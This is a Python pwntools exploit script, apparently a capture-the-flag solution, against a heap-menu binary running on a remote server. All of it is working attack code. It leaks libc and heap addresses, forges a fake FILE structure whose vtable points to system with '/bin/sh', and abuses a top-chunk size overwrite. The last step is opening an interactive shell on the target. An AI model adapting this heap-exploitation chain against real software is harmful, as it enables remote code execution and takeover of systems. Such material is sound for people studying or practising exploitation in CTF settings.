#coding:utf-8

from pwn import *

path = './pwn2'
debug = 0
attach = 0
#P = ELF(path)
context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])
context.log_level = 'debug'

if debug == 1:
	p = process(path)
	if context.arch == 'amd64':
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	else:
		libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('49.233.168.44',10002)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def new(index,size,content):
	p.recvuntil('choice: ')
	p.sendline('1')
	p.recvuntil('index: ')
	p.sendline(str(index))
	p.recvuntil('size: ')
	p.sendline(str(size))
	p.recvuntil('info: ')
	p.send(content)

def delete(index):
	p.recvuntil('choice: ')
	p.sendline('3')
	p.recvuntil('index: ')
	p.sendline(str(index))

def view(index):
	p.recvuntil('choice: ')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(str(index))

new(0,0x520,'\x11'*0x30)
new(1,0x100,'\x22'*0x30)

delete(0)

new(2,0x100,'\x00'*8)
new(0,0x400,'\x11'*8)

view(0)
p.recvuntil('\x11'*8)
libcbase = u64(p.recv(6).ljust(8,'\x00')) 
libcbase = libcbase-(0x7f8683ad4f68-0x7f8683710000)
log.success('libcbase = '+hex(libcbase))
libc.address = libcbase

p.recvuntil('\x00'*2)
heap_addr = u64(p.recv(6).ljust(8,'\x00')) - 0x70 - 0xa0
log.success('heap_addr = '+hex(heap_addr))

delete(0)
delete(1)
delete(2)

target_value = heap_addr + 0x10
target_addr  = libc.address + 0x3c55a0
top_chunk_addr = heap_addr + 0x200
offset = (target_value) + (target_addr -0x10 - top_chunk_addr) + 0x10 
log.success('target_addr = '+hex(target_addr))
log.success('target_value'+hex(target_value))
log.success('top_chunk_addr = '+hex(top_chunk_addr))
log.success('offset = '+hex(offset))

vtable = p64(heap_addr + 0xf0 + 1)

fake_file = '/bin/sh\x00'+p64(0)*4+p64(1)
fake_file += p64(0)*14 + vtable + p64(0)*3 + p64(0xffffffffffffffff)
fake_file = fake_file.ljust(0xd8,'\x00')
fake_file += vtable + p64(0)*3 + p64(libc.symbols['system'])*4

new(0,0x200,'\x00'+fake_file+p64(0)*27+'\x00'*7+p64(offset))

new(1,libcbase+(0x7f59e6fb3b20-0x7f59e6bef000)+88+1,'\x11')
new(2,target_addr -0x10 - top_chunk_addr,'\x11')

#gdb.attach(p)
p.recvuntil('choice:')
p.sendline('4')

p.interactive()